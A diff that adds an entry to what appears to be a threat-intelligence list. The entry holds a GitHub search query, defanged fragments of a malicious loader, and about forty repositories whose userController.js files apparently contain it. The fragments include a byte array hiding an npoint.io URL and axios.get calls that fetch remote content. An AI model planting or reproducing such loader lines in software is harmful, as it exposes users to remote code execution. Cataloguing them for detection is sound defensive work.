@@ -364,5 +364,56 @@ Larriemoses/TailorMind_Assessment · server/settings.js
 Mcdavid95/storm-shop · server/settings.js
 sukiejosh/storm-shop-assignment · server/settings.js
 
+# Github Query: https://github.com/search?q=const+resetPasswordUrl+%3D+%60https%3A%2F%2F%24%7Breq.get%28%22host%22%29%7D%2Fpassword%2Freset%2F%24%7BresetToken%7D+axios&type=code
+# This query detects a common format that they set
+
+# Original malicious cpde ,Defanged URL
+
+const byteArray = [104, 116, 116, 112, 115, 58, 47, 47, 97, 112, 105, 46, 110, 112, 111, 105,
+110, 116, 46, 105, 111, 47, 98, 57, 54, 52, 53, 54, 54, 52, 57, 55, 100, 57,
+56, 50, 57, 56, 100, 51, 50, 99
+const response = await axios.get('hxxps://api[.]npoint[.]io/43c98e897c8540091987')
+const rs_C = await axios.get("hxxps://api[.]npoint[.]io/632ab82bbc8d7f4c2d44");
+const rs_L = await axios.get("hxxps://api[.]npoint[.]io/e8e29958efde154f3d7d");
+# Malicious repositories
+bluehackrafestefano/test_version/backend/controllers/userController.js
+ChetnaSingh23/ThreeDJs/backend/controllers/userController.js
+VentionsTeam999/web_platform_0219/backend/controllers/userController.js
+VentionsTeam0219/0x98kn3/backend/controllers/userController.js
+LesterCerioli/infinity_force_mvp_0429/backend/controllers/userController.js
+viditkulsh/web3_game/backend/controllers/userController.js
+SwineCoder101/web_platform_0219/backend/controllers/userController.js
+ThamizhiGit/web3_game_platform/backend/controllers/userController.js
+SharonTahir/Infinity_Force_0219/backend/controllers/userController.js
+softlancer0303/infitiny_force_MVP/backend/controllers/userController.js
+python217777/web_platform_0219/backend/controllers/userController.js
+bloggerlucky43/web3project/backend/controllers/userController.js
+Wiki92x/blockchain-test/backend/controllers/userController.js
+jmanhype/project-lizzy/server/controllers/userController.js
+VENUS-git1/test/server/controllers/userController.js
+Vishalmahi77/Web3GamesOnChain/server/controllers/userController.js
+nikultaka/igorift/src/controllers/userController.js
+morakhiyakavya/infinity_force_mvp_0429/backend/controllers/userController.js
+felipedev418/RaceStake-Hub/backend/controllers/userController.js
+rmourey26/Dapp-project-tc/server/controllers/userController.js
+phil3k3/Dapp-project/server/controllers/userController.js
+SoftLanceTech0219/game_platform/backend/controllers/userController.js
+WildTrades/P12Platform_Old/backend/controllers/userController.js
+SomethingSpecial0219/Game_Platform/backend/controllers/userController.js
+theabdul129/Game_platform/backend/controllers/userController.js
+StalJoku/game-app/server/controllers/userController.js
+Deepbody-me/zoo/server/controllers/userController.js
+sohailblockchain/Zoo-Landing-Game-NFT/server/controllers/userController.js
+sohailblockchain/Zoomemory-NFT-game/server/controllers/userController.js
+chandrasaripaka/crypto-games/backend/controllers/userController.js
+chandrasaripaka/arena-game-platform/backend/controllers/userController.js
+stefann01/react-next-js-demo/backend/controllers/userController.js
+Tansi-Jones/real_estate/backend/controllers/userController.js
+sunny-sk/demo/backend/controllers/userController.js
+Yashwanth70/test_version/backend/controllers/userController.js
+ali-718/goldencity_test/backend/controllers/userController.js
+truongxavier/react2/backend/controllers/userController.js
+Rafiqul-Ala-Mahid/omnistate/src/backend/controllers/userController.js
+
 
 
